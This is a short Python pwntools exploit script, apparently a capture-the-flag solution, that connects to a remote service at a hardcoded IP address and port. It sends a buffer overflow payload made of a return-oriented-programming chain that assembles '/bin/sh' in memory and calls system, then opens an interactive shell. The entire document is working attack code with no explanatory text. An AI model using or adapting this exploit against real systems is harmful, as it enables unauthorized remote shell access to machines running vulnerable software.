from pwn import *
#p = process("./challenge3")
io  = remote('46.101.107.117',2113)
pause()
payload = 13*b'A'

new_version_offset=0x13a
POPEDI=0x804858f+new_version_offset
POPESI=0x8048591+new_version_offset
MOV=0x8048596+new_version_offset
MOVESI=0x8048599+new_version_offset
START=0x804a020+new_version_offset
SYSTEM=0x804850c+new_version_offset
def poppi(offset, ressource):
    global payload
    payload += p32(POPEDI)
    payload += p32(START+offset)
    payload += p32(POPESI)
    payload += p32(ressource)
    payload += p32(MOVESI)
    payload += p32(MOV)

poppi(0, 0x804a5b1+0x20) #/
poppi(1, 0x804a451+0x20) #/b +0x20
poppi(3, 0x804a580+0x20) #/bin..
poppi(4, 0x804a5b2+0x20) #/bin/
poppi(5, 0x804a55c+0x20) #/bin/sh
poppi(7, 0x804a02c+0x20) #/bin/sh\0x00
payload += p32(SYSTEM)
payload += p32(START)

io.sendline(payload)
io.interactive()
